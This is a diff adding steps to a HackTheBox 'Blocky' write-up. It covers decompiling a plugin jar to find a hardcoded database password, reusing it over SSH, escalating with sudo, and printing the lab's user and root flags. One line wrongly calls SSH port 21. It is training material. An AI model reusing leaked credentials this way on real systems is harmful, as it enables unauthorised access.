@@ -6,6 +6,12 @@
 
 ### 2. Enumeration on Port 80 HTTP
 
+### 3. Decompile .jar Files
+
+### 4. Credential Reuse
+
+### 5. Getting Flags
+
 # Attack
 ## 1. NMAP
 Same old. 
@@ -466,3 +472,126 @@ You don't have permission to access /server-status on this server.
 Apache/2.4.18 (Ubuntu) Server at 10.129.1.53 Port 80
 ```
 That is quite a lot of things to go through. 
+
+## 3. Decompile .jar Files
+As we've seen in the previous machine [Bank](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Bank.md), it's not all about exploits sometimes. Bad configuration and practices can lead us into a machine.
+
+After going through the things from `nmap --script vuln`, we got nothing.
+
+The files and directories that surfaced in GoBuster did not show any interesting config files as well, except 2.
+```
+http://10.129.1.53/plugins/
+-> files
+    .jarBlockyCore.jar 883 Bytes
+    .jargriefprevention-1.11.2-3.1.1.298.jar 520 KB
+```
+I know from my short Cyber Security course that .NET is relatively easy to decompile and reverse engineer, and IIRC same with Java. Let's reverse engineer these files.
+
+Looking for a Java Decompiler, we come across one that looks decent, JD-Gui. Let's install that.
+```
+hippoeug@kali:~/Downloads$ sudo dpkg -i jd-gui-1.6.6.deb
+[sudo] password for hippoeug: 
+Selecting previously unselected package jd-gui.
+(Reading database ... 311041 files and directories currently installed.)
+Preparing to unpack jd-gui-1.6.6.deb ...
+Unpacking jd-gui (1.6.6-0) ...
+Setting up jd-gui (1.6.6-0) ...
+hippoeug@kali:~/Downloads$ 
+```
+
+Upon opening the `.jarBlockyCore.jar` file, we see a file, `BlockyCore.class`. Let's see what's inside that file.
+```
+package com.myfirstplugin;
+
+public class BlockyCore {
+  public String sqlHost = "localhost";
+  
+  public String sqlUser = "root";
+  
+  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+  
+  public void onServerStart() {}
+  
+  public void onServerStop() {}
+  
+  public void onPlayerJoin() {
+    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+  }
+  
+  public void sendMessage(String username, String message) {}
+}
+```
+Interesting, a username and password! Now this reminds me of two exercises we did previously, [Beep](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Beep.md) & [Bank](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Bank.md) where we utilized the reuse of credentials found.
+
+## 4. Credential Reuse
+Now that we know that a username is "root" & password is "8YsqfCTnvxAUeduzjNSXe22", we can start using these to log onto the different sites.
+
+Let's try `http://10.129.1.53/phpmyadmin/` first. I was able to successfully log into this phpMyAdmin page! Potentially, if I need to upload a reverse shell, I could attempt to do it from here.
+
+Followed by `http://10.129.1.53/wp-admin/`. Attempt to use these credentials were unsucessful, as we got a `ERROR: Invalid username. Lost your password?` error.
+
+Since we also saw the existence of Port 21 SSH, we try to login with the credentials.
+```
+hippoeug@kali:~$ ssh root@10.129.1.53
+The authenticity of host '10.129.1.53 (10.129.1.53)' can't be established.
+ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.1.53' (ECDSA) to the list of known hosts.
+root@10.129.1.53's password: 
+Permission denied, please try again.
+root@10.129.1.53's password: 
+```
+This didn't work. Since we saw a username `notch` earlier, let's try that.
+```
+hippoeug@kali:~$ ssh notch@10.129.1.53
+notch@10.129.1.53's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
+notch@Blocky:~$
+```
+This worked!
+
+## 5. Getting Flags
+Time to find flags.
+```
+otch@Blocky:~$ dir
+minecraft  user.txt
+notch@Blocky:~$ cat user.txt
+59fee0977fb60b8a0bc6e41e751f3cd5
+```
+Cool, one down.
+
+Let's find the root flag.
+```
+notch@Blocky:/$ dir
+bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  works
+notch@Blocky:/$ cd root
+-bash: cd: root: Permission denied
+notch@Blocky:/$ 
+```
+We do not have root privileges. Searching online, we come across a tip to enumerate.
+```
+notch@Blocky:/$ id
+uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)    
+```
+This shows that notch user is a sudo-er!
+
+To login, we just have to use `-i`! To enumerate a user privileges, we could use `-l`.
+```
+notch@Blocky:/$ sudo -i
+[sudo] password for notch: 
+root@Blocky:~# dir
+dhcp.sh  root.txt
+root@Blocky:~# cat root.txt
+0a9694a5b4d272c694679f7860f1cd5f
+```
+Got it!
